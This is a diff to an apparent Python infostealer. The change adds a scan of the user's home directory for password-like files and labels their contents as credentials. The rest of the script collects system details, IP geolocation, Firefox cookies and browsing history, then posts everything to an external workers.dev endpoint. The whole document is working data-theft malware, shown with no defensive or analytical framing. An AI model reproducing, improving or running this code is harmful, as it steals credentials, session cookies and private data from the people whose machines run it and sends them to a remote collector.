@@ -1,4 +1,4 @@
-```python	
+```python
 import os
 import sys
 import json
@@ -11,7 +11,7 @@ import datetime
 import requests
 import sqlite_utils
 home = pathlib.Path.home()
-def get_moz():
+def get_win_moz():
 	p = pathlib.Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox"
 	t = ["cookies.sqlite", "places.sqlite"]
 	c = []
@@ -30,7 +30,30 @@ def get_moz():
 					u.append(r['url'])
 		return c, u
 	return None, None
-				
+	
+def check_file(file):
+	p = Path(file)
+	if p.exists and p.is_file():
+		data = p.read_text()
+		if len(p.name) > 20 and len(data) >= 200:
+			return False
+		else:
+			if p.suffix in ('.txt','.dat','.pwd') or p.name in ("my_passwords","passwords","passwd","pwd","senha","senhas","minhas senhas"):
+				return True
+			else:
+				return False				
+	else:
+		return False		
+	
+def check_files():
+	p = pathlib.Path.home()
+	data = []
+	for i in p.rglob("*"):
+		if check_file(i):
+			d = i.read_text()
+			data.append(d)
+	return data
+			
 def format1(s, path=False):
 	if not path:
 		return str(s).replace("[","").replace("]","")
@@ -101,15 +124,76 @@ nd = platform.node()
 re = platform.release()
 d_path = format1(pts[0], path=True)
 f_path = format1(pts[1], path=True)
-f_co = get_moz()
+f_co = get_win_moz()
 cookies = format1(f_co[0])
 places = format1(f_co[1], path=True)
+f_data = format1(check_files(), path=True)
 
-payload = b"\n---------- \xf0\x9d\x90\x94\xf0\x9d\x90\x92\xf0\x9d\x90\x84\xf0\x9d\x90\x91 \xf0\x9d\x90\x83\xf0\x9d\x90\x80\xf0\x9d\x90\x93\xf0\x9d\x90\x80 ----------\n\nExecution time: {time}\n\nUser: {user}\n\nLogged Users: {lo}\n\nCPU: {cc}\n\nCPU Frequency: {cf}\n\nRAM: {ram}MB\n\nPublic IP: {public_ip()}\n\nCountry: {i_info['country']}\n\nRegion: {i_info['regionName']}\n\nCity: {i_info['city']}\n\nISP: {i_info['isp']}\n\nOrganization: {i_info['org']}\n\nAlias: {i_info['as']}\n\nIPv4: {i4}\n\nIPv6: {i6}\n\nMAC: {mc}\n\nSystem: {sy}\n\nNode: {nd}\n\nVersion: {re}\n\nGoogle Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}\n\n-------- \xf0\x9d\x90\x85\xf0\x9d\x90\xa2\xf0\x9d\x90\xa5\xf0\x9d\x90\x9e\xf0\x9d\x90\xac \xf0\x9d\x90\x80\xf0\x9d\x90\xa7\xf0\x9d\x90\x9d \xf0\x9d\x90\x83\xf0\x9d\x90\xa2\xf0\x9d\x90\xab\xf0\x9d\x90\x9e\xf0\x9d\x90\x9c\xf0\x9d\x90\xad\xf0\x9d\x90\xa8\xf0\x9d\x90\xab\xf0\x9d\x90\xa2\xf0\x9d\x90\x9e\xf0\x9d\x90\xac ---------\n\n{d_path}\n\n{f_path}\n\n--------------- \xf0\x9d\x90\x82\xf0\x9d\x90\xa8\xf0\x9d\x90\xa8\xf0\x9d\x90\xa4\xf0\x9d\x90\xa2\xf0\x9d\x90\x9e\xf0\x9d\x90\xac ----------------\n\n{cookies}\n\n----------- \xf0\x9d\x90\x85\xf0\x9d\x90\xa2\xf0\x9d\x90\xab\xf0\x9d\x90\x9e\xf0\x9d\x90\x9f\xf0\x9d\x90\xa8\xf0\x9d\x90\xb1 \xf0\x9d\x90\x87\xf0\x9d\x90\xa2\xf0\x9d\x90\xac\xf0\x9d\x90\xad\xf0\x9d\x90\xa8\xf0\x9d\x90\xab\xf0\x9d\x90\xb2 ------------\n\n{places}\n\n----------------------------------------\n"
-content = json.dumps({"msg": str(f"{payload.decode()}"})
+payload = f"""
+---------- 𝐔𝐒𝐄𝐑 𝐃𝐀𝐓𝐀 ----------
+
+Execution time: {time}
+
+User: {user}
+
+Logged Users: {lo}
+
+CPU: {cc}
+
+CPU Frequency: {cf}
+
+RAM: {ram}MB
+
+Public IP: {public_ip()}
+
+Country: {i_info['country']}
+
+Region: {i_info['regionName']}
+
+City: {i_info['city']}
+
+ISP: {i_info['isp']}
+
+Organization: {i_info['org']}
+
+Alias: {i_info['as']}
+
+IPv4: {i4}
+
+IPv6: {i6}
+
+MAC: {mc}
+
+System: {sy}
+
+Node: {nd}
+
+Version: {re}
+
+Google Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}
+
+-------- 𝐅𝐢𝐥𝐞𝐬 𝐀𝐧𝐝 𝐃𝐢𝐫𝐞𝐜𝐭𝐨𝐫𝐢𝐞𝐬 ---------
+
+{d_path}
+
+{f_path}
+
+--------------- 𝐂𝐨𝐨𝐤𝐢𝐞𝐬 ----------------
+
+{cookies}
+
+----------- 𝐅𝐢𝐫𝐞𝐟𝐨𝐱 𝐇𝐢𝐬𝐭𝐨𝐫𝐲 ------------
+
+{places}
+
+-------- (𝗣𝗿𝗼𝗯𝗮𝗯𝗹𝘆) 𝗖𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀 --------
+
+{f_data}
+
+----------------------------------------
+"""
+content = json.dumps({"msg": payload})
 r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
 if r.status_code == 200:
 	print("yes")
-	
-
 ```
